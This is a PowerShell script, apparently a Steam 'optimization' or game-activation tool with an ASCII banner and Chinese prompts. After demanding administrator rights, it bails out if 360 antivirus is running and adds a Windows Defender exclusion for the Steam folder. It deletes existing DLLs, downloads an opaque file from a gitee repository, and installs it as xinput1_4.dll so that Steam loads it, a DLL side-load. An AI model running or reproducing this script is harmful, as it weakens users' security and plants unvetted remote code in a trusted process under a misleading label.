Clear-Host
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue

$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
    Write-Host "[请重新打开Power shell 打开方式以管理员身份运行]" -ForegroundColor:red
    return
}

function Start-SteamOptimization {
    if (Get-Process "360Tray*","360sd*" -ErrorAction SilentlyContinue) {
        Write-Host "[360]" -ForegroundColor:Red
        return
    }

    $steamRegPath = 'HKCU:\Software\Valve\Steam'
    $steamPath = (Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue).SteamPath

    if ([string]::IsNullOrEmpty($steamPath)) {
        Write-Host "[Steam]" -ForegroundColor:Red
        return
    }

    Write-Host "[ServerStart        OK]" -ForegroundColor:green

    Get-Process -Name "steam*" -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 2

    Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue

    Write-Host "[Result->0          OK]" -ForegroundColor:green

    $files = @("steam.cfg", "version.dll", "user32.dll", "steam.cfg", "hid.dll", "appcache/packageinfo.vdf", "package/beta", "wtsapi32.dll", "xinput1_4.dll")
    foreach ($file in $files) {
        Remove-Item (Join-Path $steamPath $file) -Force -ErrorAction SilentlyContinue
    }

    $libraryUrl = "https://gitee.com/z4078/aa/raw/master/wt"
    $localDataUrl = "https://gitee.com/z4078/aa/raw/master/localData.vdf"

    $d = Join-Path $steamPath "xinput1_4"

    try {
        Invoke-RestMethod -Uri $libraryUrl -OutFile $d
        Start-Sleep 0.5
        Rename-Item -Path $d -NewName "$d.dll" -ErrorAction SilentlyContinue
        Write-Host "[Result->1          OK]" -ForegroundColor:green

        $d = Join-Path $env:LOCALAPPDATA "Steam\localData.vdf"
        Invoke-RestMethod -Uri $localDataUrl -OutFile $d
        Write-Host "[Result->2          OK]" -ForegroundColor:green

        Start-Process "steam://" -ErrorAction SilentlyContinue
        Write-Host "[连接服务器成功在Steam入激活 3秒后自动关闭]" -ForegroundColor:green
        Start-Sleep 3
    }
    catch {
        Write-Host "[Download Failed]" -ForegroundColor:Red
    }

    exit
}

Start-SteamOptimization